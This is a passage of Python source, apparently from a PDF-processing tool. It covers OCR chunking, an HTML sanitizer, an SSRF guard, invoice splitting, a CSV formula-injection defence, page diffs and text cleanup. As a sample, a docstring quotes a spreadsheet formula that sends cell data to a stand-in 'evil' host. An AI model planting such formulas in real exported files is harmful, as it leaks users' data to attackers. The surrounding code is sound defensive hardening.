    boundary = "----pdfstudio%s" % uuid.uuid4().hex
    pre = (
        "--%s\r\nContent-Disposition: form-data; name=\"force_ocr\"\r\n\r\n%s\r\n"
        "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"chunk.pdf\"\r\n"
        "Content-Type: application/pdf\r\n\r\n"
    ) % (boundary, "true" if force_ocr else "false", boundary)
    body = pre.encode("utf-8") + filedata + ("\r\n--%s--\r\n" % boundary).encode("utf-8")
    req = urllib.request.Request(endpoint, data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=%s" % boundary)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        payload = resp.read().decode("utf-8", "replace")
    return json.loads(payload).get("markdown", "")


def _marker_http(in_pdf, endpoint, force_ocr=False, chunk=100, input_sha=None,
                 soft_deadline_ms=None, progress=None, cache_root=None):
    """Chunk a PDF, POST each chunk to an HTTP Marker service, concat the returned Markdown.
    RESUMABLE: chunk markdown is cached under cwd/.pdf-cache/marker/<key> (persists across
    runs — the adapter's temp dir does NOT, so the cache must live in the workflow dir like
    _embed_cached). A killed or soft-deadline-truncated run continues where it left off.
    Returns (markdown, complete: bool). A 1.5 GB PDF can't be one upload, hence chunking."""
    import math
    import time
    import pikepdf
    if not re.match(r"^https?://", endpoint or ""):
        raise ValueError("endpoint must be an http:// or https:// URL")
    import hashlib
    if not input_sha:
        with open(in_pdf, "rb") as f:
            input_sha = hashlib.sha256(f.read()).hexdigest()
    key = hashlib.sha256(("\0".join([input_sha, endpoint, "1" if force_ocr else "0",
                                     str(chunk), _MARKER_SCHEMA])).encode("utf-8")).hexdigest()[:16]
    if cache_root is None:
        cache_root = os.path.join(os.getcwd(), ".pdf-cache", "marker", key)
    chunks_dir = os.path.join(cache_root, "chunks")
    os.makedirs(chunks_dir, exist_ok=True)

    t0 = time.monotonic()
    deadline = (soft_deadline_ms / 1000.0) if soft_deadline_ms else None
    durations = []
    complete = True
    with pikepdf.open(in_pdf) as pdf:
        n = len(pdf.pages)
        total = max(1, math.ceil(n / chunk))
        for ci in range(total):
            mdp = os.path.join(chunks_dir, "%06d.md" % ci)
            done = os.path.join(chunks_dir, "%06d.done" % ci)
            if os.path.exists(done) and os.path.exists(mdp):
                continue
            # Soft-deadline: stop PREDICTIVELY (before we'd exceed it, and well before the JS
            # hard kill) so the cache stays consistent and we can return a resumable partial.
            if deadline is not None:
                est = (sum(durations) / len(durations)) if durations else 0.0
                if (time.monotonic() - t0) + est > deadline:
                    complete = False
                    break
            cp = os.path.join(cache_root, "_chunk_%06d.pdf" % ci)
            dst = pikepdf.Pdf.new()
            for pi in range(ci * chunk, min(ci * chunk + chunk, n)):
                dst.pages.append(pdf.pages[pi])
            dst.save(cp)
            dst.close()
            cstart = time.monotonic()
            md = _marker_http_post(endpoint, cp, force_ocr)
            durations.append(time.monotonic() - cstart)
            try:
                os.remove(cp)
            except OSError:
                pass
            # Idempotent write: .tmp-<pid> + atomic replace, then the .done sentinel LAST, so a
            # concurrent run over the same key can't read a half-written chunk.
            tmp = mdp + ".tmp-%d" % os.getpid()
            with open(tmp, "w", encoding="utf-8") as f:
                f.write(md)
            os.replace(tmp, mdp)
            open(done, "w").close()
            if progress:
                progress(ci + 1, total)
        total_final = total
    # concat whatever completed, in page order
    out = []
    for ci in range(total_final):
        mdp = os.path.join(chunks_dir, "%06d.md" % ci)
        if os.path.exists(mdp):
            with open(mdp, "r", encoding="utf-8") as f:
                out.append(f.read())
    md_all = "\n\n".join(out)
    if complete:
        try:
            import shutil
            shutil.rmtree(cache_root, ignore_errors=True)   # clean cache only when fully done
        except Exception:  # noqa: BLE001
            pass
    return md_all, complete


_HTML_DROP_TAGS = {
    "script", "iframe", "object", "embed", "applet", "frame", "frameset",
    "form", "input", "button", "select", "textarea", "option", "base",
}
_HTML_VOID_TAGS = {
    "area", "br", "col", "embed", "hr", "img", "input", "link", "meta",
    "param", "source", "track", "wbr",
}
_HTML_BAD_URL = ("javascript:", "vbscript:", "data:text/html")


def _sanitize_html(html_text, block_remote=False):
    """Strip the active/executable parts of an HTML document before we hand it to a
    browser to print. The HTML in a workflow is semi-untrusted (a crafted .opw.yaml
    can carry any markup), and headless Chrome will happily run <script>, so we
    remove the script/embed/form vectors, every on* event handler, javascript: URLs
    and meta-refresh. Layout-bearing markup (style/CSS, link, img, tables, …) is kept
    so html_to_pdf / markdown_to_pdf still render faithfully. Defense in depth — the
    browser sandbox stays on too. Never raises: a parse hiccup returns the input.

    `block_remote` (used for untrusted email in eml_to_pdf) neutralizes remote http(s)
    resource URLs (img/link/etc.) so the renderer can't fetch tracking pixels — the
    "images blocked" default every email client uses."""
    from html.parser import HTMLParser
    import html as _h

    url_attrs = ("href", "src", "action", "background", "xlink:href", "poster", "srcset")

    class _S(HTMLParser):
        def __init__(self):
            HTMLParser.__init__(self, convert_charrefs=True)
            self.out = []
            self.skip = 0   # inside a dropped element (skip its content)
            self.raw = 0    # inside <style> — emit CSS verbatim, don't escape it

        def _attrs(self, tag, attrs):
            keep = []
            for k, v in attrs:
                lk = (k or "").lower()
                lv = (v or "").strip().lower().replace(" ", "")
                if lk.startswith("on") or lk in ("srcdoc", "formaction"):
                    continue
                if tag == "meta" and lk == "http-equiv" and lv == "refresh":
                    return None  # drop the whole <meta refresh>
                if lk in url_attrs and lv.startswith(_HTML_BAD_URL):
                    continue
                # Untrusted email: strip remote resource URLs (tracking pixels, remote CSS).
                if block_remote and lk in url_attrs and (lv.startswith(("http://", "https://", "//"))):
                    continue
                keep.append(lk if v is None else '%s="%s"' % (lk, _h.escape(v, quote=True)))
            return keep

        def handle_starttag(self, tag, attrs):
            t = tag.lower()
            if self.skip or t in _HTML_DROP_TAGS:
                if t in _HTML_DROP_TAGS and t not in _HTML_VOID_TAGS:
                    self.skip += 1
                return
            a = self._attrs(t, attrs)
            if a is None:
                return
            if t == "style":
                self.raw += 1
            self.out.append("<%s%s>" % (t, (" " + " ".join(a)) if a else ""))

        def handle_startendtag(self, tag, attrs):
            t = tag.lower()
            if self.skip or t in _HTML_DROP_TAGS:
                return
            a = self._attrs(t, attrs)
            if a is None:
                return
            self.out.append("<%s%s />" % (t, (" " + " ".join(a)) if a else ""))

        def handle_endtag(self, tag):
            t = tag.lower()
            if t in _HTML_DROP_TAGS:
                if self.skip:
                    self.skip -= 1
                return
            if self.skip:
                return
            if t == "style" and self.raw:
                self.raw -= 1
            if t not in _HTML_VOID_TAGS:
                self.out.append("</%s>" % t)

        def handle_data(self, data):
            if self.skip:
                return
            self.out.append(data if self.raw else _h.escape(data, quote=False))

        def handle_decl(self, decl):
            if not self.skip:
                self.out.append("<!%s>" % decl)

        def handle_comment(self, data):
            pass  # comments can smuggle conditional-comment scripts — drop them

    try:
        p = _S()
        p.feed(html_text or "")
        p.close()
        return "".join(p.out)
    except Exception:  # noqa: BLE001
        return html_text


def _remote_allowed():
    """True when the user enabled pdfStudio.allowRemoteRender.

    Arrives as an environment variable, set by the extension from a MACHINE-scoped
    setting. That matters: it is the one channel a workflow cannot write to. Any
    policy expressed as an op param is granted by whoever authored the .opw.yaml —
    which, in the threat model these guards exist for, is the attacker.
    """
    return os.environ.get("PDFSTUDIO_ALLOW_REMOTE") == "1"


def _sanitize_flag(params):
    """Whether to strip scripts before rendering HTML.

    `sanitize: false` is honoured ONLY when remote render is enabled. The sanitizer
    defends against HTML the workflow author controls, so letting that same author
    turn it off with a workflow param defeats it entirely — the switch has to live
    somewhere they cannot reach. Nothing changes for the default (sanitize on).
    """
    if params.get("sanitize", True):
        return True
    if _remote_allowed():
        return False
    sys.stderr.write(
        "pdf-studio: ignoring `sanitize: false` — scripts in the HTML would run during "
        "render. Enable the \"pdfStudio.allowRemoteRender\" setting to allow it.\n"
    )
    return True


def _assert_fetchable_url(url):
    """Refuse to fetch a URL that resolves onto the local host or a private network.

    url_to_pdf takes its target from the workflow, so without this an .opw.yaml is
    a request forgery primitive running with the user's network position: cloud
    metadata (169.254.169.254 → instance credentials), a router admin page, an
    unauthenticated service on localhost. Rendering a PUBLIC page is the op's whole
    purpose, so the guard blocks only the internal ranges rather than gating the
    op itself; intranet rendering stays available behind allowRemoteRender.

    Residual risk (documented in docs/security.md): the name is resolved here and
    again by the engine, so a DNS entry that changes between the two — rebinding —
    is not defeated. Pinning the address is not possible across Chrome, WeasyPrint
    and urllib alike.
    """
    import ipaddress
    import socket
    from urllib.parse import urlsplit

    parts = urlsplit(str(url))
    host = parts.hostname
    if not host:
        raise ValueError("url_to_pdf: no host in URL")
    if _remote_allowed():
        return
    try:
        port = parts.port or (443 if parts.scheme == "https" else 80)
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except Exception as e:  # noqa: BLE001 — DNS failure: refuse rather than guess
        raise ValueError("url_to_pdf: cannot resolve %s (%s)" % (host, e))
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if (ip.is_loopback or ip.is_private or ip.is_link_local
                or ip.is_reserved or ip.is_multicast or ip.is_unspecified):
            raise ValueError(
                "url_to_pdf refuses %s — it resolves to %s, an address on this machine or "
                "your private network. Enable the \"pdfStudio.allowRemoteRender\" setting to "
                "render intranet pages." % (host, ip)
            )


def _render_html_to_pdf(html, out_pdf, engine="auto", base_url=None, sanitize=True, block_remote=False):
    """Render an HTML string to out_pdf. Engine priority for "auto": a system
    Chrome/Edge (highest fidelity, no bundle) → WeasyPrint (if its native libs
    import) → PyMuPDF's Story engine (pure-Python, always available). An explicit
    engine ("chrome"|"weasyprint"|"story") forces just that one. Returns the
    engine name used. `sanitize` (default on) strips scripts/embeds/event handlers
    first — pass sanitize=False only for HTML you fully trust. `block_remote` (for
    untrusted email) also neutralizes remote resource URLs (tracking pixels)."""
    if sanitize:
        html = _sanitize_html(html, block_remote=block_remote)
    engine = str(engine or "auto").lower()
    if engine in ("auto", "chrome"):
        try:
            return "chrome (%s)" % _render_via_chrome(html, out_pdf, base_url=base_url)
        except Exception:
            if engine == "chrome":
                raise
    if engine in ("auto", "weasyprint"):
        try:
            import weasyprint
            weasyprint.HTML(string=html, base_url=base_url).write_pdf(out_pdf)
            return "weasyprint"
        except Exception:
            if engine == "weasyprint":
                raise
    import fitz
    story = fitz.Story(html=html)
    writer = fitz.DocumentWriter(out_pdf)
    where = fitz.Rect(36, 36, 576, 756)  # letter with 0.5in margins
    more = 1
    while more:
        dev = writer.begin_page(fitz.paper_rect("letter"))
        more, _ = story.place(where)
        story.draw(dev)
        writer.end_page()
    writer.close()
    return "pymupdf-story"


# --- split_invoices helpers -------------------------------------------------

# Inter-token spacing is [ \t]* (NOT \s*) so a bare "INVOICE" header line can't
# swallow the newline and consume the number word on the following line.
_INVOICE_NUM_RE = re.compile(r"(?:invoice|inv|bill|receipt)s?[ \t]*(?:no\.?|number|num|#)?[ \t]*[:#\-]?[ \t]*([A-Za-z0-9][A-Za-z0-9\-/]{1,})", re.I)
_PAGE1_RE = re.compile(r"page\s+1\s+of\s+\d+", re.I)
_TAIL_RE = re.compile(r"amount\s+due|balance\s+due|grand\s+total|total\s+due|\btotal\b|thank\s+you", re.I)
_MONTHS = {m: i for i, m in enumerate(
    ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"], start=1)}
_DATE_RES = [
    re.compile(r"\b(\d{4})[-/.](\d{1,2})[-/.](\d{1,2})\b"),          # 2024-01-31
    re.compile(r"\b(\d{1,2})[-/.](\d{1,2})[-/.](\d{4})\b"),          # 31/01/2024 or 01/31/2024
    re.compile(r"\b(\d{1,2})\s+([A-Za-z]{3,9})\.?\s+(\d{4})\b"),     # 31 January 2024
    re.compile(r"\b([A-Za-z]{3,9})\.?\s+(\d{1,2}),?\s+(\d{4})\b"),   # January 31, 2024
]
_WIN_RESERVED = {"con", "prn", "aux", "nul"} | {"com%d" % i for i in range(1, 10)} | {"lpt%d" % i for i in range(1, 10)}


def _page_head(text, lines=15):
    """Top region of a page: the first `lines` non-empty lines (original case)."""
    out = []
    for ln in (text or "").splitlines():
        ln = ln.strip()
        if ln:
            out.append(ln)
        if len(out) >= lines:
            break
    return "\n".join(out)


def _invoice_number(head):
    """First plausible invoice number in `head` (must contain a digit)."""
    for m in _INVOICE_NUM_RE.finditer(head or ""):
        tok = m.group(1).strip(" .-/").upper()
        if len(tok) >= 3 and any(c.isdigit() for c in tok):
            return tok
    return ""


def _norm_date(s):
    """First date found in `s`, normalized to YYYY-MM-DD, else "" (best-effort)."""
    for rx in _DATE_RES:
        m = rx.search(s or "")
        if not m:
            continue
        g = m.groups()
        try:
            if rx is _DATE_RES[0]:            # YYYY M D
                y, mo, d = int(g[0]), int(g[1]), int(g[2])
            elif rx is _DATE_RES[1]:          # n n YYYY  (day-first only when field1 > 12)
                a, b, y = int(g[0]), int(g[1]), int(g[2])
                d, mo = (a, b) if a > 12 else (b, a)
            elif rx is _DATE_RES[2]:          # 31 Jan 2024
                d, mo, y = int(g[0]), _MONTHS.get(g[1][:3].lower(), 0), int(g[2])
            else:                            # Jan 31, 2024
                mo, d, y = _MONTHS.get(g[0][:3].lower(), 0), int(g[1]), int(g[2])
            if mo and 1 <= mo <= 12 and 1 <= d <= 31 and 1900 <= y <= 2100:
                return "%04d-%02d-%02d" % (y, mo, d)
        except Exception:
            continue
    return ""


def _invoice_meta(head):
    """(invoice_number, vendor, date) from a page's head text."""
    lines = [ln for ln in (head or "").splitlines() if ln.strip()]
    vendor = lines[0].strip() if lines else ""
    return _invoice_number(head), vendor, _norm_date(head)


def _invoice_boundaries(heads, fulls, keywords):
    """Return sorted 0-based start-page indices. Page 0 always starts invoice 1.

    If the document uses "Page 1 of N" counters, trust them EXCLUSIVELY: they mark
    true first-pages and never fire on a continuation page, so they cleanly avoid
    over-splitting multi-page invoices whose continuation pages repeat the vendor
    header, a running total, or an invoice number. Only when no counters are
    present do we fall back to the softer, noisier signals — a header keyword right
    after a page that ended with a total, or an invoice-number change corroborated
    by a header keyword."""
    if not heads:
        return [0]
    page1 = [bool(_PAGE1_RE.search((f or "").lower())) for f in fulls]
    if any(page1[1:]):
        return [0] + [i for i in range(1, len(fulls)) if page1[i]]

    kws = [k.lower() for k in (keywords or []) if k]
    starts = [0]
    cur_num = _invoice_number(heads[0])
    for i in range(1, len(heads)):
        has_kw = any(k in heads[i].lower() for k in kws)
        num = _invoice_number(heads[i])
        prev_tail = bool(_TAIL_RE.search((fulls[i - 1] or "").lower()))
        if (has_kw and prev_tail) or (num and num != cur_num and has_kw):
            starts.append(i)
            cur_num = num
    return starts


def _safe_filename(s, fallback):
    """Filesystem-safe stem from untrusted text (blocks path traversal)."""
    s = str(s or "")
    s = re.sub(r"[\\/]+", "_", s)          # path separators
    s = s.replace("..", "_")               # traversal
    s = re.sub(r"[\x00-\x1f]", "", s)      # control chars
    s = re.sub(r'[<>:"|?*]', "_", s)       # Windows-illegal
    s = re.sub(r"\s+", "_", s).strip("._ ")
    if not s or s.lower() in _WIN_RESERVED:
        return fallback
    return s[:120]


def _render_image_name(tpl, i, page):
    """Apply a page-image filename template.

    Mirrors renderTemplate in core/src/opw/template.ts — keep the two in step. Supports
    {i} (1-based output index) and {page} (source page number), each with an optional
    zero-pad: {i:03} or {i:03d}. An unknown token is left VERBATIM rather than dropped, so
    a typo shows up in the filename instead of silently collapsing every page onto one name.

    `{stem}` is resolved on the TypeScript side before the template reaches us — it is
    constant for the whole run and only the adapter knows the input path. That two-stage
    substitution works precisely BECAUSE unknown tokens are passed through untouched.
    """
    tokens = {"i": i, "page": page}

    def sub(m):
        key, pad = m.group(1), m.group(2)
        if key not in tokens:
            return m.group(0)
        v = tokens[key]
        if pad and isinstance(v, int):
            return str(v).zfill(int(pad[1:]))
        return str(v)

    try:
        return re.sub(r"\{([a-z_][a-z0-9_]*)(?::(0\d+)d?)?\}", sub, str(tpl), flags=re.I)
    except Exception:
        return "page_%d" % page


def _render_name(tpl, index, number, vendor, date, page_start, page_end):
    """Apply a filename template; fall back to invoice_NNNN on any error."""
    fields = {
        "index": index, "invoice_number": number or "", "vendor": vendor or "",
        "date": date or "", "page_start": page_start, "page_end": page_end,
    }
    try:
        return tpl.format(**fields)
    except Exception:
        return "invoice_%04d" % index


# --- CSV formula injection (CWE-1236) ----------------------------------------------
# ONE guard for every CSV this sidecar writes. Every cell we emit is DOCUMENT-derived
# (page text, form values, table cells) or MODEL-derived (extract_receipt's fields, read
# off a page image a stranger may have crafted) — so a cell is attacker-controlled text,
# and RFC-4180 quoting alone does nothing to stop it becoming a FORMULA when the file is
# opened in Excel / Sheets / LibreOffice.
_CSV_NUMERIC = re.compile(r"^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$")


def _csv_safe(x):
    """Neutralize a cell that would be evaluated as a formula by a spreadsheet.

    A merchant name of `=IMPORTXML("http://evil/?d="&A1,"/x")` (or a `+`/`-`/`@` DDE
    payload) exfiltrates the row the moment the CSV is opened. Prefixing with an
    apostrophe makes the spreadsheet show the literal text instead.
    Two deliberate carve-outs keep the data usable downstream: plain numbers
    (`-45.00`, `+1.2e3`) are left alone so amounts stay numeric, and a lone `-`/`+`
    (the usual "no value" placeholder in a table) is not a formula either."""
    s = "" if x is None else str(x)
    head = s.lstrip("\t\r\n ")          # spreadsheets trim leading whitespace first
    if len(head) > 1 and head[0] in "=+-@" and not _CSV_NUMERIC.match(head):
        return "'" + s
    return s


def _csv_field(x):
    s = _csv_safe(x)
    return '"' + s.replace('"', '""') + '"' if any(c in s for c in (",", '"', "\n")) else s


# --- compare_pdfs helpers ---------------------------------------------------

def _norm_page_text(t):
    """Whitespace-collapsed page text, for page-level alignment matching."""
    return " ".join((t or "").split())


def _align_pages(base_texts, against_texts):
    """Align two page sequences by their (normalized) text so inserted/deleted
    pages are detected instead of shifting everything. Returns a list of
    (kind, base_pg, against_pg) with 0-based page numbers (None where absent):
      "equal"   both present, text matched
      "replace" both present, text differs
      "removed" only in base
      "added"   only in against
    """
    import difflib
    sm = difflib.SequenceMatcher(None, base_texts, against_texts, autojunk=False)
    out = []
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        if tag == "equal":
            for k in range(i2 - i1):
                out.append(("equal", i1 + k, j1 + k))
        elif tag == "replace":
            # pair up overlapping range; extras become add/remove
            n = min(i2 - i1, j2 - j1)
            for k in range(n):
                out.append(("replace", i1 + k, j1 + k))
            for k in range(n, i2 - i1):
                out.append(("removed", i1 + k, None))
            for k in range(n, j2 - j1):
                out.append(("added", None, j1 + k))
        elif tag == "delete":
            for k in range(i1, i2):
                out.append(("removed", k, None))
        elif tag == "insert":
            for k in range(j1, j2):
                out.append(("added", None, k))
    return out


def _pixmap_rgb(page, dpi):
    """Render a page to an RGB (no-alpha) fitz.Pixmap at dpi."""
    import fitz
    pix = page.get_pixmap(dpi=dpi)
    if pix.alpha or pix.colorspace is None or pix.colorspace.n not in (1, 3):
        pix = fitz.Pixmap(fitz.csRGB, pix)
    return pix


def _draw_hl(page, rect, rgb):
    """Draw a highlight over rect: translucent fill if supported, else an outline."""
    try:
        page.draw_rect(rect, color=rgb, fill=rgb, width=0.5, fill_opacity=0.30, stroke_opacity=0.9)
    except Exception:
        try:
            page.draw_rect(rect, color=rgb, width=1.5)
        except Exception:
            pass


def _compare_image(base_doc, against_doc, kind, bp, ap, added_lines, dpi, tol=0):
    """Compose a highlighted PNG (fitz.Pixmap) for one change. Highlights the NEW
    (against) page for changed/added content and the base page for a removed page.
    For a modified page it anchors highlights to the changed text via search_for,
    falling back to a row-band pixel diff when the text can't be located. `tol` is
    the per-channel pixel tolerance for that fallback (ignore anti-aliasing noise)."""
    import fitz
    if kind == "removed":
        page, rgb, rects = base_doc.load_page(bp), (0.9, 0.15, 0.15), None
    elif kind == "added":
        page, rgb, rects = against_doc.load_page(ap), (0.15, 0.6, 0.2), None
    else:  # replace — highlight the against page
        page, rgb, rects = against_doc.load_page(ap), (0.95, 0.6, 0.0), []
        for ln in (added_lines or []):
            if len(ln) < 2:
                continue
            try:
                rects.extend(page.search_for(ln))
            except Exception:
                pass
        if not rects:  # pixel fallback (non-text change, or text not locatable)
            try:
                pa = _pixmap_rgb(base_doc.load_page(bp), 72)
                pb = _pixmap_rgb(page, 72)
                sy = page.rect.height / pb.height
                rects = [fitz.Rect(0, y0 * sy, page.rect.width, y1 * sy) for (y0, y1) in _changed_bands(pa, pb, 8, tol)]
            except Exception:
                rects = None
        if not rects:
            rects = None  # couldn't localize → whole-page tint below
    out = fitz.open()
    r = page.rect
    np_ = out.new_page(width=r.width, height=r.height)
    np_.insert_image(np_.rect, pixmap=page.get_pixmap(dpi=dpi))
    for rr in (rects if rects else [r]):
        _draw_hl(np_, rr, rgb)
    pix = np_.get_pixmap(dpi=dpi)
    out.close()
    return pix


def _bytes_exceed(a, b, tol):
    """True if any byte in equal-length buffers a/b differs by more than tol."""
    for i in range(len(a)):
        d = a[i] - b[i]
        if d > tol or -d > tol:
            return True
    return False


def _changed_bands(pa, pb, band_rows, tol=0):
    """Row-band diff of two same-size RGB pixmaps → list of (y0, y1) changed
    bands in pixel rows. A fast C-level slice-inequality gate is refined by a
    per-byte tolerance check (tol in 0..255) so anti-aliasing noise is ignored."""
    if pa.width != pb.width or pa.height != pb.height or pa.n != pb.n:
        return [(0, pa.height)]
    sa, sb, stride, h = pa.samples, pb.samples, pa.width * pa.n, pa.height
    bands, y = [], 0
    while y < h:
        y1 = min(y + band_rows, h)
        a, b = sa[y * stride:y1 * stride], sb[y * stride:y1 * stride]
        if a != b and (tol <= 0 or _bytes_exceed(a, b, tol)):
            if bands and bands[-1][1] == y:
                bands[-1] = (bands[-1][0], y1)  # merge adjacent
            else:
                bands.append((y, y1))
        y = y1
    return bands


def _diff_pdf_page(out, base_doc, against_doc, kind, bp, ap, added_lines, dpi, label, tol=0):
    """Append one page to `out`: base (left) vs against (right), the changed side
    highlighted, with a caption. Builds the shareable side-by-side "diff PDF"."""
    import fitz
    left = base_doc.load_page(bp).get_pixmap(dpi=dpi) if bp is not None else None
    if kind == "removed" and bp is not None:  # highlight the vanished page on the left
        left = _compare_image(base_doc, against_doc, "removed", bp, None, None, dpi, tol)
    right = _compare_image(base_doc, against_doc, kind, bp, ap, added_lines, dpi, tol) if ap is not None else None
    f, gap, cap = 72.0 / dpi, 12.0, 22.0
    lw = (left.width * f) if left else 150.0
    lh = (left.height * f) if left else 200.0
    rw = (right.width * f) if right else 150.0
    rh = (right.height * f) if right else 200.0
    W = gap * 3 + lw + rw
    H = cap + gap * 2 + max(lh, rh)
    page = out.new_page(width=W, height=H)
    page.insert_textbox(fitz.Rect(gap, 4, W - gap, cap), label, fontsize=10, fontname="helv")
    if left:
        page.insert_image(fitz.Rect(gap, cap + gap, gap + lw, cap + gap + lh), pixmap=left)
    else:
        page.insert_textbox(fitz.Rect(gap, cap + gap, gap + 160, cap + gap + 30), "(no base page)", fontsize=9, fontname="helv")
    rx = gap * 2 + lw
    if right:
        page.insert_image(fitz.Rect(rx, cap + gap, rx + rw, cap + gap + rh), pixmap=right)
    else:
        page.insert_textbox(fitz.Rect(rx, cap + gap, rx + 160, cap + gap + 30), "(no against page)", fontsize=9, fontname="helv")


# --- Extracted-text quality -------------------------------------------------
# Raw PDF text is noisy: running headers/footers repeat on every page, words are
# hyphen-split across line breaks, and paragraphs arrive hard-wrapped one line at a
# time. These three passes clean that up. They make `extract_text` far more usable
# and materially improve everything downstream that reads the text (summarize,
# translate, semantic_search) — especially on OCR output.

def _dehyphenate(text):
    """"inter-\\nnational" → "international". Joins a word split by a hyphen at a
    line break (incl. the Unicode hyphen/non-breaking hyphen)."""
    return re.sub(r"(\w)[-‐‑][ \t]*\r?\n[ \t]*(\w)", r"\1\2", text or "")


def _reflow_text(text):
    """Rejoin lines that were hard-wrapped mid-sentence, so paragraphs come back as
    single lines. A blank line still starts a new paragraph, and list items keep
    their own line."""
    out = []
    for raw in (text or "").split("\n"):
        line = raw.strip()
        if not line:
            if out and out[-1] != "":
                out.append("")
            continue
        is_list = re.match(r"^([*•◦▪‣-]|(\d{1,2}|[a-zA-Z])[.)])\s+", line)
        prev = out[-1] if out else ""
        if prev and not is_list and not re.search(r"[.!?:;\"'”’]$", prev):
            out[-1] = prev + " " + line
        else:
            out.append(line)
    return "\n".join(out).strip()


def _strip_headers_footers(pages):
    """Drop a page's first/last line when that exact line repeats across most pages —
    a running header/footer. `pages` is [{"page": n, "text": s}, ...]. Page numbers are
    ignored as footer candidates (they differ per page, so they'd never be "common"
    anyway, and treating them as text would suppress a real footer)."""
    if len(pages) < 3:
        return pages
    from collections import Counter
    firsts, lasts, freq = [], [], Counter()
    for p in pages:
        lines = [l.strip() for l in (p["text"] or "").split("\n") if 5 < len(l.strip()) < 100]
        first = lines[0] if lines else None
        last = lines[-1] if len(lines) > 1 else None
        if last and (re.fullmatch(r"[\d\s/–—-]+", last) or re.search(r"page\s+\d+", last, re.I)):
            last = None
        firsts.append(first)
        lasts.append(last)
        for cand in (first, last):
            if cand:
                freq[cand] += 1
    threshold = max(2, int(len(pages) * 0.6))
    common = {k for k, c in freq.items() if c >= threshold}
    if not common:
        return pages
    cleaned = []
    for i, p in enumerate(pages):
        t = p["text"] or ""
        if firsts[i] and firsts[i] in common:
            nl = t.find(firsts[i])
            if nl != -1:
                t = t[nl + len(firsts[i]):]
        if lasts[i] and lasts[i] in common:
            idx = t.rfind(lasts[i])
            if idx != -1:
                t = t[:idx]
        cleaned.append({"page": p["page"], "text": t.strip()})
    return cleaned


def _clean_pages(pages, remove_headers_footers=True, fix_hyphenation=True, reflow=True):
    """Run the enabled cleanup passes over [{"page","text"}, ...]."""
    if remove_headers_footers:
        pages = _strip_headers_footers(pages)
    out = []
    for p in pages:
        t = p["text"] or ""
        if fix_hyphenation:
            t = _dehyphenate(t)
        if reflow:
            t = _reflow_text(t)
        out.append({"page": p["page"], "text": t})
    return out


def _page_texts(doc):
    return [{"page": i + 1, "text": (doc.load_page(i).get_text() or "")} for i in range(doc.page_count)]


def _page_token(tok, page_count):
    """Expand one page-list token to 1-based page numbers, in order.

    Mirrors core/src/opw/pages.ts — keep the two in step. Accepts a number, a
    numeric string, a range ("5-8", descending "8-5"), "last", and "5-last"."""
    if isinstance(tok, bool):
        return []
    if isinstance(tok, (int, float)):
        n = int(tok)
        return [n] if 1 <= n <= page_count else []

    def endpoint(part):
        part = part.strip().lower()
        if part == "last":
            return page_count if page_count >= 1 else None
        if not part.isdigit():
            return None
        n = int(part)
        return n if n >= 1 else None

    if not isinstance(tok, str):
        return []
    s = tok.strip()
    if not s:
        return []
    single = endpoint(s)
    if single is not None:
        return [single] if 1 <= single <= page_count else []
    # Split on the FIRST hyphen only, so "5-8-10" is rejected rather than
    # silently read as "5-8".
    hy = s.find("-")
    if hy <= 0 or hy == len(s) - 1:
        return []
    a, b = endpoint(s[:hy]), endpoint(s[hy + 1:])
    if a is None or b is None:
        return []
    # Clamp to the document BEFORE building the range — an authored
    # "1-999999999" must cost the page count, not a billion list entries.
    lo, hi = max(1, min(a, b)), min(page_count, max(a, b))
    if lo > hi:
        return []
    return list(range(lo, hi + 1)) if a <= b else list(range(hi, lo - 1, -1))


def _page_set(pages, page_count):
    """Normalize a 1-based `pages` param to a set of valid 1-based page numbers.
    Items may be numbers or range tokens ("5-8", "5-last", "last").
    Returns None for "all pages" (param omitted/empty) — callers treat None as every page."""
    if pages is None:
        return None
    if not isinstance(pages, (list, tuple)):
        pages = [pages]
    want = set()
    for p in pages:
        want.update(_page_token(p, page_count))
    return want or None




# --- Semantic search --------------------------------------------------------

def _is_heading_like(par):
    """Short, title-cased/numbered/ALL-CAPS fragments ("CHAPTER 3 10") make useless
    standalone chunks — detect them so we can fold them into the next paragraph."""
    t = (par or "").strip()
    if not t:
        return False
    words = t.split()
    if len(words) > 10:
        return False
    letters = re.sub(r"[^A-Za-z]", "", t)
    upper = re.sub(r"[^A-Z]", "", letters)
    mostly_upper = bool(letters) and len(upper) / len(letters) > 0.8
    if re.match(r"^(chapter|section|part|appendix|abstract|introduction|background|conclusion|references)\b", t, re.I):
        return True
    if re.match(r"^(\d+(\.\d+)*|[IVXLCDM]+)\s*[:.)-]?\s*\w+", t) and len(words) <= 8:
        return True
    if mostly_upper and re.match(r"^[^.!?]{1,120}$", t):
        return True
    return bool(re.search(r"[:：]\s*$", t)) and len(words) <= 12


def _chunk_pages(pages, max_words=200, overlap_words=30):
    """Paragraph-aware chunking that keeps each chunk tied to its page. Respects
    paragraph boundaries, folds heading-only fragments into the following paragraph,
    splits an over-long paragraph on sentence boundaries, and repeats `overlap_words`
    from the previous chunk so a passage split across a boundary is still findable.
    Returns [{"page": n, "text": s}, ...]."""
    min_words = max(30, int(max_words * 0.4))
    chunks = []
    for p in pages:
        paras = [x.strip() for x in re.split(r"\n\s*\n", p["text"] or "") if x.strip()]
        if not paras:
            continue
        # fold a heading into the paragraph that follows it (drop a trailing one)
        merged, i = [], 0
        while i < len(paras):
            if _is_heading_like(paras[i]) and i + 1 < len(paras):
                merged.append(paras[i] + "\n\n" + paras[i + 1])
                i += 2
            elif _is_heading_like(paras[i]):
                i += 1  # trailing heading = page furniture
            else:
                merged.append(paras[i])
                i += 1
        cur, cur_n = [], 0
        def flush():
            if cur:
                chunks.append({"page": p["page"], "text": " ".join(cur).strip()})
        for par in merged:
            words = par.split()
            if len(words) > max_words:          # over-long paragraph → sentence split
                flush()                          # keep chunk order stable
                cur, cur_n = [], 0
                sentences = re.findall(r"[^.!?]+[.!?]+[\"'”’)\]]*\s*|[^.!?]+$", par) or [par]
                # A single "sentence" longer than the target (e.g. an unpunctuated wall of
                # text) can't be placed whole — hard-split it into word windows so no chunk
                # blows past max_words (which would swamp an embedding).
                units = []
                for s in sentences:
